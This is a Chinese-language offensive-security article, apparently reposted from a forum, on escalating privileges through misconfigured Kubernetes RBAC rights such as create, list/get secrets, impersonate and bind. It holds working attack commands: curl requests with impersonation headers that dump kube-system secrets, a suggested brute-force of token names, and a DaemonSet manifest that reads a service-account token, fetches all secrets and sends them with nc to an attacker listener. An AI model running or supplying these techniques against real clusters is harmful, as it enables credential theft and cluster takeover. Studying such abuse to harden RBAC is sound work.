      namespace: kube-system
    roleRef:
      kind: ClusterRole
      name: cluster-admin
      apiGroup: rbac.authorization.k8s.io
这里是直接使用的cluster-admin 这个对象（`Kubernetes`集群内置的 ClusterRole
对象）而不是单独新建的ClusterRole对象。内置的集群角色和集群角色绑定都可以查看
    kubectl get clusterrole
    kubectl get clusterrolebinding
# RBAC权限滥用提权
权限滥用主要在对特定资源有特定操作的情况下，可以有特定的权限提升。  
对哪里资源有哪些操作权限通过上面已经说了，看rules的字段内容即可，配置`resources`和`verbs`都为*那不用说，所有资源都可以进行任意操作。  
## 枚举当前RBAC权限
在指定当前通过渗透得到用户凭据或者sa的凭据后，可以先枚举当前有哪些权限：
[upl-
也可以使用curl对apiserver的api进行访问来区别当前的权限:  
枚举之后应该对当前凭据对资源的操作有个数了，下面列举在分配权限时，哪些情况下有提权提升的可能。
## create pods权限
`resources: ["*"] verbs:
["create"]`：`resources`为*或者为`pods`的情况下，verbs是`create`，在集群中可以创建任意资源，比如像pods，roles.而创建pods的命名空间也取决你role中metadata.namespace的值：  
如果有create权限，常见攻击手法就是创建挂载根目录的pod，跳到node：  
## list secrets权限
`resources: ["*"] verbs:
["list"]`：`resources`为*或者为`secrets`的情况下，verbs是`list`,在集群中可以列出其他user的secrets，一般拿来寻找特权账号凭据。
具有list权限或者说是list secrets权限的role可以列出集群中重要的secrets，包括管理的keys(JWT):  
利用：  
`curl -v -H "Authorization: Bearer "
https://:/api/v1/namespaces/kube-system/secrets/`
## get secret权限
`resources: ["*"] verbs: ["get"]`:
`resources`为*或者为`secrets`的情况下，verbs是`get`，get可以在集群中获得其他service
accounts的secrets。
如下定义Role的resources字段为*或者secrets对象，并且verbs为get，这时候有权限获得其他secrets。  
get权限能访问的api：
    GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
但是get和list不一样，get需要知道secrets的id才能读：  
图出处：list和get来窃取凭据的区别：
这时候用读secrets来攻击的话常见手法是读默认的sa的token,默认有这些sa:  
对应的token:
    kubectl -n kube-system get secret -n kube-system
可以看到每个sa的token都是sa的`name-token-随机五个字符`,
其中随机的字符是由数字和字母组合，特定的27个字符：
27的5次方也是14,348,907可能，写个py脚本的迭代器爆破即可：  
## get list watch secrets权限
`resources: ["*"] verbs:
["get","list","watch"]`:resources字段为*或者secrets的话可以利用这三个权限，来创建一个恶意pod后通过挂载secrets以至获取别人的secrets，然后外带：
这里使用`automountServiceAccountToken`将特权服务帐户的令牌挂载到
pod，使用令牌获取拿到所有secrets后用nc传到攻击者监听端口，当前也可以使用其他方式带外：  
图出处，创建一个"hot pod"来窃取凭据：
## Impersonate权限
用户可以通过模拟标头充当另一个用户。这些让请求手动覆盖请求身份验证的用户信息。例如，管理员可以使用此功能通过临时模拟另一个用户并查看请求是否被拒绝来调试授权策略。
以下 HTTP 标头可用于执行模拟请求：
  * `Impersonate-User`：要充当的用户名。
  * `Impersonate-Group`：要充当的组名。可以多次提供设置多个组。可选的。需要“模拟用户”。
  * `Impersonate-Extra-( extra name )`：用于将额外字段与用户关联的动态标题。可选的。需要“模拟用户”。
  * `Impersonate-Uid`：代表被模拟用户的唯一标识符。可选的。需要“模拟用户”。Kubernetes 对此字符串没有任何格式要求。
有了`Impersonate`权限攻击者可以模拟一个有特权的账户或者组：  
Role:  
binding:
模拟用户的操作是通过调用K8s API 的Header来指定的，kubectl可以加入--as参数：
    kubectl --as  ...
    kubectl --as  --as-group  ...
请求apiserver:
    curl -k -v -XGET -H "Authorization: Bearer " \
    -H "Impersonate-Group: system:masters"\ 
    -H "Impersonate-User: null" \
    -H "Accept: application/json" \
    https://:/api/v1/namespaces/kube-system/secrets/
## 其他API资源对象的create权限滥用
如果当前Role的权限，是其他API对象的创建，比如`Deployment, Daemonsets, Statefulsets,
Replicationcontrollers, Replicasets,
Jobs，Cronjobs`等，都是可以进行创建然后在containers.args字段加入执行的e恶意命令：
    apiVersion: apps/v1
    kind: DaemonSet
    metadata:
      name: alpine
      namespace: kube-system
    spec:
      selector:
        matchLabels:
          name: alpine
      template:
        metadata:
          labels:
            name: alpine
        spec:
          serviceAccountName: bootstrap-signer
          automountServiceAccountToken: true
          hostNetwork: true
          containers:
          - name: alpine
            image: alpine
            command: ["/bin/sh"]
            args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
其他创建pod的方法具体可以查看pod-templates：
## Bind权限
用有`bind`权限 **允许用户将高角色绑定到当前已经被控制的帐户** 导致权限提权。
下面的ClusterRole使用了bind权限，允许用户创建一个与管理ClusterRole(默认的高特权角色)的RoleBinding，并添加任何用户，包括自己，到这个管理ClusterRole：  
**那么就有可能创造出恶意角色binging** ，它将管理员角色绑定到现在已经被控制的帐户:  
使用kubectl指定token或者curl到apiserver来完成绑定：
    curl -k -v -X POST -H "Authorization: Bearer " \ 
    -H "Content-Type: application/json" \
    https://:/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings \
     -d @malicious-RoleBinging.json
然后当前账户就是高权限角色，自然可以列出secret等:
    curl -k -v -X POST -H "Authorization: Bearer "\
    -H "Content-Type: application/json"
    https://:/api/v1/namespaces/kube-system/secret
本文首发于火线Zone：
作者：今天R了吗